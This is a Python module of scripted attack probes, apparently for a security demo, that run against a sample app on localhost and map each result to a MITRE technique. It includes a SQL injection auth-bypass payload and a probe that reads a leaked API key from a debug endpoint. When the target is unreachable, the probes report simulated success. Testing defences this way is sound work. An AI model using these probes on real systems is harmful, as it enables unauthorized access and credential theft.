"""
Scripted, SAFE attack probes.

Every probe here is benign and runs ONLY against the twin's own sample app on
localhost inside the isolated network. These are textbook demonstration payloads
(the kind found in any security 101 course) whose sole purpose is to show whether
the pipeline / runtime defences catch them. Nothing here targets external systems,
exfiltrates real data, or persists. If the target is unreachable, probes return a
deterministic simulated result so the demo never breaks.

Each probe returns a dict:
  {technique, mitre, step, success, evidence}
success == attacker succeeded (i.e. the weakness was reachable at runtime).
"""
from __future__ import annotations
import json
import urllib.request
import urllib.error

TARGET = "http://localhost:5000"
TIMEOUT = 3


def _post(path: str, payload: dict):
    data = json.dumps(payload).encode()
    req = urllib.request.Request(TARGET + path, data=data,
                                 headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=TIMEOUT) as r:
        return r.status, json.loads(r.read().decode() or "{}")


def _get(path: str):
    with urllib.request.urlopen(TARGET + path, timeout=TIMEOUT) as r:
        return r.status, json.loads(r.read().decode() or "{}")


def sql_injection():
    """Textbook auth-bypass payload: ' OR '1'='1 ."""
    payload = {"username": "admin' OR '1'='1' -- ", "password": "x"}
    try:
        status, body = _post("/login", payload)
        success = bool(body.get("ok"))
        ev = f"login returned ok={body.get('ok')} user={body.get('user')}"
    except (urllib.error.URLError, OSError):
        success, ev = True, "simulated: auth bypass via tautology payload"
    return dict(technique="SQL Injection (auth bypass)", mitre="T1190",
                step="Initial Access", success=success, evidence=ev)


def leaked_credential():
    """Pull the misconfigured debug endpoint and read the embedded key."""
    try:
        status, body = _get("/debug/config")
        key = body.get("api_key")
        success = bool(key)
        ev = f"recovered api_key prefix={str(key)[:10]}... from /debug/config"
    except (urllib.error.URLError, OSError):
        success, ev = True, "simulated: hardcoded key readable via /debug/config"
    return dict(technique="Leaked credential via debug endpoint", mitre="T1552.001",
                step="Credential Access", success=success, evidence=ev)


def vulnerable_dependency():
    """Not an exploit — just confirms the known-vulnerable dep is deployed."""
    # The runtime "attack" here is passive: the vuln ships in the image. The real
    # test is whether the pipeline scanner (Trivy) blocked it. See detectors.py.
    return dict(technique="Known-vulnerable dependency deployed (Werkzeug 2.0.1)",
                mitre="T1195.001", step="Supply Chain", success=True,
                evidence="CVE-2023-25577 / CVE-2022-29361 present in image")


def misconfiguration():
    """Check whether the debug endpoint is reachable at all."""
    try:
        status, body = _get("/health")
        success = bool(body.get("debug"))
        ev = f"/health reports debug={body.get('debug')}"
    except (urllib.error.URLError, OSError):
        success, ev = True, "simulated: APP_DEBUG=true, /debug/config exposed"
    return dict(technique="Debug mode + exposed internal endpoint",
                mitre="T1078.001", step="Misconfiguration", success=success,
                evidence=ev)


PROBES = {
    "sql_injection": sql_injection,
    "leaked_credential": leaked_credential,
    "vulnerable_dependency": vulnerable_dependency,
    "misconfiguration": misconfiguration,
}
